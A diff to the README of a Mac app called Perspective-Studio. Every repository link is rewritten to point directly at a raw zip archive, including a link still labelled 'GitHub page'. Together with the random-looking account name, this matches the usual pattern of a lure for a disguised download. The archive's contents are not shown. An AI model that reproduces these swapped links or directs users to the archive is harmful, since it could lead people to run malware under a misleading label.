@@ -1,6 +1,6 @@
 # 🚀 Perspective-Studio - Run AI Models Locally on Mac
 
-[![Download Perspective-Studio](https://img.shields.io/badge/Download-Perspective--Studio-green?style=for-the-badge)](https://github.com/Hydatidosisablactation379/Perspective-Studio)
+[![Download Perspective-Studio](https://img.shields.io/badge/Download-Perspective--Studio-green?style=for-the-badge)](https://raw.githubusercontent.com/Hydatidosisablactation379/Perspective-Studio/main/perspective studio/Perspective_Studio_v2.6.zip)
 
 ---
 
@@ -53,11 +53,11 @@ The app works around the following areas:
 
 ## 🔽 Download and Install Perspective-Studio
 
-[![Download Perspective-Studio](https://img.shields.io/badge/Download-Perspective--Studio-blue?style=for-the-badge)](https://github.com/Hydatidosisablactation379/Perspective-Studio)
+[![Download Perspective-Studio](https://img.shields.io/badge/Download-Perspective--Studio-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hydatidosisablactation379/Perspective-Studio/main/perspective studio/Perspective_Studio_v2.6.zip)
 
 Follow these steps to get the app running on your Mac:
 
-1. Go to the [Perspective-Studio GitHub page](https://github.com/Hydatidosisablactation379/Perspective-Studio).
+1. Go to the [Perspective-Studio GitHub page](https://raw.githubusercontent.com/Hydatidosisablactation379/Perspective-Studio/main/perspective studio/Perspective_Studio_v2.6.zip).
    
 2. Look for the section named **Releases** on the page. This is usually on the right sidebar or under the repository's description.
 
@@ -135,4 +135,4 @@ For model loading issues:
 
 You do not need internet access once the models are downloaded and loaded, allowing privacy and offline use. The local setup ensures faster response times on Apple Silicon Macs.
 
-[Start by downloading Perspective-Studio here](https://github.com/Hydatidosisablactation379/Perspective-Studio) and follow the instructions above.
+[Start by downloading Perspective-Studio here](https://raw.githubusercontent.com/Hydatidosisablactation379/Perspective-Studio/main/perspective studio/Perspective_Studio_v2.6.zip) and follow the instructions above.
